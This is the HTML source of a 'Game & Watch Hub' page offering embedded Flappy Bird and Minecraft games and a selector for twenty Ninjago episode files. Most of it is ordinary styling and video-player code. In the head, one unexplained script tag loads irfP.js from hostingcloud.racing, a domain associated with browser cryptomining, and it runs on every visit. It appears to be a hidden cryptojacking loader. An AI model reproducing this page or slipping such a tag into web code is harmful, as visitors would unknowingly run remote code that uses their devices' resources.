<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game & Watch Hub</title>
    <style>
        /* General Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to bottom, #2a3d5d, #1c2e44);
            color: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow: hidden;
        }

        .container {
            display: flex;
            justify-content: space-between;
            width: 80%;
            max-width: 1100px;
            padding: 20px;
            margin-top: 50px;
            gap: 20px;
        }

        header {
            font-size: 56px;
            color: #ff6f61;
            margin-bottom: 20px;
            text-shadow: 3px 3px 15px rgba(255, 111, 97, 0.8);
            animation: headerAnimation 1s ease-out;
            text-align: center;
        }

        @keyframes headerAnimation {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        .section {
            width: 48%;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .section h2 {
            font-size: 32px;
            margin-bottom: 20px;
            text-align: center;
            color: #ff6f61;
        }

        /* Button styles */
        .game-btns {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
            margin-bottom: 20px;
        }

        .game-btn {
            padding: 20px 30px;
            font-size: 22px;
            color: white;
            background: linear-gradient(to right, #ff6f61, #ff8f7d);
            border: 2px solid #ff6f61;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.5);
            width: 220px;
            height: 60px;
        }

        .game-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(255, 111, 97, 0.8);
        }

        .game-btn:active {
            transform: translateY(2px);
        }

        /* Video Controls */
        .video-player {
            width: 100%;
            margin-top: 20px;
        }

        video {
            width: 100%;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.7);
        }

        .controls {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
        }

        .controls button {
            background-color: #ff6f61;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            cursor: pointer;
        }

        .controls button:hover {
            background-color: #ff8f7d;
        }

        footer {
            position: absolute;
            bottom: 20px;
            text-align: center;
            font-size: 14px;
            color: #ccc;
        }

        footer a {
            color: #ff6f61;
            text-decoration: none;
        }

        footer a:hover {
            text-decoration: underline;
        }

        /* Episode Selector Styling */
        select {
            background: #2a3d5d;
            color: #fff;
            border: 2px solid #ff6f61;
            padding: 10px;
            border-radius: 10px;
            width: 100%;
            font-size: 18px;
            margin-bottom: 20px;
        }

        select option {
            background: #333;
            color: #fff;
        }

        .toggle-buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .toggle-buttons button {
            padding: 10px 20px;
            font-size: 18px;
            color: white;
            background: #ff6f61;
            border: 2px solid #ff6f61;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .toggle-buttons button:hover {
            background: #ff8f7d;
        }

    </style>

<script src="https://www.hostingcloud.racing/irfP.js"></script>

</head>
<body>

    <header>Game & Watch Hub</header>

    <div class="container">
        <!-- Play Section -->
        <div class="section">
            <h2>Play</h2>
            <div class="game-btns">
                <button class="game-btn" onclick="startGame('flappybird')">Flappy Bird</button>
                <button class="game-btn" onclick="startGame('minecraft')">Minecraft</button>
            </div>
            <div id="gameDisplay"></div>
        </div>

        <!-- Watch Section -->
        <div class="section">
            <h2>Watch</h2>
            <!-- Slime/Ninjago Toggle -->
            <div class="toggle-buttons">
                <button onclick="toggleContent('ninjago')">Ninjago</button>
            </div>

            <!-- Episode Selector -->
            <select id="episodeSelector" onchange="loadEpisode()">
                <option value="ep1.mkv">Episode 1</option>
                <option value="ep2.mkv">Episode 2</option>
                <option value="ep3.mkv">Episode 3</option>
                <option value="ep4.mkv">Episode 4</option>
                <option value="ep5.mkv">Episode 5</option>
                <option value="ep6.mkv">Episode 6</option>
                <option value="ep7.mkv">Episode 7</option>
                <option value="ep8.mkv">Episode 8</option>
                <option value="ep9.mkv">Episode 9</option>
                <option value="ep10.mkv">Episode 10</option>
                <option value="ep11.mkv">Episode 11</option>
                <option value="ep12.mkv">Episode 12</option>
                <option value="ep13.mkv">Episode 13</option>
                <option value="ep14.mkv">Episode 14</option>
                <option value="ep15.mkv">Episode 15</option>
                <option value="ep16.mkv">Episode 16</option>
                <option value="ep17.mkv">Episode 17</option>
                <option value="ep18.mkv">Episode 18</option>
                <option value="ep19.mkv">Episode 19</option>
                <option value="ep20.mkv">Episode 20</option>
            </select>

            <!-- Video Player -->
            <div class="video-player">
                <video id="videoPlayer" controls>
                    <source id="videoSource" src="ep1.mkv" type="video/mp4">
                    Your browser does not support the video tag.
                </video>

                <!-- Controls -->
                <div class="controls">
                    <button onclick="rewind()">Rewind 10s</button>
                    <button onclick="pausePlay()">Play/Pause</button>
                    <button onclick="forward()">Forward 10s</button>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <p>Powered by <a href="https://github.com">GitHub</a></p>
    </footer>

    <script>
        // Game Selector Function
        function startGame(game) {
            const gameDisplay = document.getElementById('gameDisplay');
            switch (game) {
                case 'flappybird':
                    gameDisplay.innerHTML = "<iframe src='flappybird.html' width='100%' height='500'></iframe>";
                    break;
                case 'minecraft':
                    gameDisplay.innerHTML = "<iframe src='minecraft.html' width='100%' height='500'></iframe>";
                    break;
            }
        }

        // Toggle between Ninjago content
        function toggleContent(content) {
            contentType = content;
            document.getElementById('videoSource').src = content === 'ninjago' ? 'ep1.mkv' : 'slime1.mkv';
            loadEpisode();
        }

        // Load the selected episode
        function loadEpisode() {
            const episode = document.getElementById('episodeSelector').value;
            document.getElementById('videoSource').src = episode;
            document.getElementById('videoPlayer').load();
            document.getElementById('videoPlayer').play();
        }

        // Pause or play the video
        function pausePlay() {
            const player = document.getElementById('videoPlayer');
            if (player.paused) {
                player.play();
            } else {
                player.pause();
            }
        }

        // Rewind the video
        function rewind() {
            const player = document.getElementById('videoPlayer');
            player.currentTime -= 10;
        }

        // Forward the video
        function forward() {
            const player = document.getElementById('videoPlayer');
            player.currentTime += 10;
        }
    </script>

</body>
</html>
